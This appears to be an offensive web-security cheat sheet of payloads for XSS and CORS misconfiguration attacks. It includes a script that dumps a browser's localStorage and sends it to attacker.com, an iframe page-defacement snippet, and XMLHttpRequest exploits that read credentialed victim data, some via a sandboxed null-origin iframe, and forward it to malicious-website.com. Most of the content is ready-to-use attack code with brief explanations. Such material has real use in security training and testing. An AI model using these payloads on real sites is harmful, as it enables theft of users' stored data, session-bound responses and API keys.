## Stealing Local Storage via Js

    <script>
    let i=0;
    let stor="";
    let img = new Image();

    while(localStorage.key(i)!== null)
    {
        stor += localStorage.key(i) + ": " + localStorage.getItem(localStorage.key(i)) + "\n";
        i++;
    }

    img.src="http://attacker.com/steal.php?stor=" + stor;

    </script>

## Access the parent Document from an iFrame

    <script>
        window.parent.document.body.innerHTML = 'defaced';
    </script>

## Server-generated ACAO header from client-specified Origin header

Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain

    GET /sensitive-victim-data HTTP/1.1
    Host: vulnerable-website.com
    Origin: https://malicious-website.com
    Cookie: sessionid=...

It then responds with:

    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: https://malicious-website.com
    Access-Control-Allow-Credentials: true

Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain.

    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
    location='//malicious-website.com/log?key='+this.responseText;
    };

## Whitelisted null origin value

Some applications might whitelist the null origin to support local development of the application. For example, suppose an application receives the following cross-origin request:

    GET /sensitive-victim-data
    Host: vulnerable-website.com
    Origin: null

And the server responds with:

    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: null
    Access-Control-Allow-Credentials: true

In this situation, an attacker can use various tricks to generate a cross-origin request containing the value null in the Origin header. This will satisfy the whitelist, leading to cross-domain access.

    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','vulnerable-website.com/sensitive-victim-data',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
    location='malicious-website.com/log?key='+this.responseText;
    };
    </script>"></iframe>

## Exploiting XSS via CORS trust relationships

Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.

Given the following request:

    GET /api/requestApiKey HTTP/1.1
    Host: vulnerable-website.com
    Origin: https://subdomain.vulnerable-website.com
    Cookie: sessionid=...

If the server responds with:

    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
    Access-Control-Allow-Credentials: true

Then an attacker who finds an XSS vulnerability on subdomain.vulnerable-website.com could use that to retrieve the API key, using a URL like:

    https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>